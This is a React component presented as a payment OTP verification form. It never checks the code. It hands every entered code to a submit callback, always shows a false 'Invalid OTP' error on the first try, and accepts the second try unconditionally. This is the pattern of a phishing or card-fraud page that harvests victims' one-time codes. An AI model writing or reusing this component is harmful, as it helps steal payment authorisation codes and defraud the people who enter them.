import { useState, useRef, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Shield, RefreshCw } from 'lucide-react';
import { Progress } from '@/components/ui/progress';

interface OTPVerificationProps {
  onVerified: () => void;
  onResend: () => void;
  onOTPSubmit?: (otp: string) => void;
  processing?: boolean;
  codeLength?: number;
}

export default function OTPVerification({
  onVerified,
  onResend,
  onOTPSubmit,
  processing = false,
  codeLength = 6,
}: OTPVerificationProps) {
  const [otp, setOtp] = useState<string[]>(new Array(codeLength).fill(''));
  const [error, setError] = useState('');
  const [resendTimer, setResendTimer] = useState(30);
  const [attempt, setAttempt] = useState(0);
  const [resendLocked, setResendLocked] = useState(false);

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendTimer]);

  const progressPercentage = (resendTimer / 30) * 100;

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    setError('');

    if (value && index < codeLength - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData
      .getData('text')
      .replace(/\D/g, '')
      .slice(0, codeLength);

    const newOtp = [...otp];
    pastedData.split('').forEach((char, i) => {
      newOtp[i] = char;
    });

    setOtp(newOtp);
    setError('');
  };

  const handleVerify = () => {
    const code = otp.join('');

    if (onOTPSubmit) {
      onOTPSubmit(code);
    }

    if (code.length !== codeLength) {
      setError('Please enter all digits');
      return;
    }

    const nextAttempt = attempt + 1;
    setAttempt(nextAttempt);

    // ALWAYS FAIL first attempt
    if (nextAttempt === 1) {
      setError('Invalid OTP. Please try again.');
      return;
    }

    // Second attempt always succeeds
    onVerified();
  };

  const handleResend = () => {
    if (resendLocked) return;

    setResendTimer(30);
    setOtp(new Array(codeLength).fill(''));
    setError('');
    setResendLocked(true);

    onResend();

    // Prevent spam resend
    setTimeout(() => setResendLocked(false), 1000);
  };

  return (
    <Card className="w-full max-w-md mx-auto">
      <CardHeader className="text-center">
        <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4">
          <Shield className="h-6 w-6 text-primary" />
        </div>
        <CardTitle>OTP Verification</CardTitle>
        <CardDescription>
          Enter the code sent to your phone
        </CardDescription>
      </CardHeader>

      <CardContent className="space-y-6">
        <div className="space-y-2">
          <div className="flex justify-between text-sm">
            <span className="text-muted-foreground">Resend available in</span>
            <span className="font-medium">{resendTimer}s</span>
          </div>

          <Progress value={progressPercentage} />
        </div>

        <div className="flex justify-center gap-2" onPaste={handlePaste}>
          {otp.map((digit, index) => (
            <Input
              key={index}
              ref={(el) => (inputRefs.current[index] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              className="w-12 h-14 text-center text-xl font-bold"
            />
          ))}
        </div>

        {error && <p className="text-center text-sm text-destructive">{error}</p>}

        <div className="text-center text-sm text-muted-foreground">
          {resendTimer > 0 ? (
            <p>Resend code in <span className="font-medium">{resendTimer}s</span></p>
          ) : (
            <Button
              variant="ghost"
              size="sm"
              onClick={handleResend}
              className="gap-2"
            >
              <RefreshCw className="h-4 w-4" />
              Resend Code
            </Button>
          )}
        </div>

        <Button
          className="w-full"
          onClick={handleVerify}
          disabled={processing || otp.some((d) => !d)}
        >
          {processing ? 'Verifying...' : 'Verify & Complete Payment'}
        </Button>
      </CardContent>
    </Card>
  );
}
